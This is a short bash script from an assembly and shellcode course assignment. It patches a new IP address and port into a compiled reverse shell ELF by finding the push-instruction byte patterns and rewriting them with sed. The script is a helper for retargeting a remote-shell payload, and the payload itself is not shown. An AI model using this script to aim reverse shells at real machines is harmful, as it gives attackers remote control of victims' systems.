#!/bin/bash

#Description:	Assignment #2 (Reverse_Shell_Bind_TCP, configure ip and port)
#Author: 		Paolo Stivanin <https://github.com/polslinux>
#SLAE ID:		526

if [ -z "$1" ]; then
	echo "Usage: $0 <elf-file>"
	exit -1
fi


oldip=$(od -t x1 $1|grep -E -o "43 68.{0,12}"|sed 's/\ //g'|sed 's/^.\{4\}//g')
hexoldip=$(printf '%s' $oldip | sed 's/../&\\x/g' | sed 's/\(\)/&\\x/' | sed 's/..$//')

oldport=$(od -t x1 $1|grep -o -P "66 68.{6}"|sed 's/\(......\)//g'|sed 's/\ //g')
hexoldport=$(printf '%s' $oldport | sed 's/\(..\)/&\\x/' | sed 's/\(\)/&\\x/')

echo "[?] Write IP in dotted format (eg 192.168.1.167): "
read dotip
hexip=$(printf '%02x' $(echo ${dotip//./ }))

echo "[?] Write port number: "
read port
hexport=$(printf '%x' $port)

echo "[+] HEX code of choosed IP: $hexip"
echo "[+] HEX code of choosed port: $hexport"

echo "[+] Updating $1 elf..."
newport=$(printf '%s' $hexport | sed 's/\(..\)/&\\x/' | sed 's/\(\)/&\\x/')
sed -i "s/\x66\x68$hexoldport/\x66\x68$newport/g" $1
newip=$(printf '%s' $hexip | sed 's/../&\\x/g' | sed 's/\(\)/&\\x/' | sed 's/..$//')
sed -i "s/\x43\x68$hexoldip/\x43\x68$newip/g" $1

echo "[+] All done :)"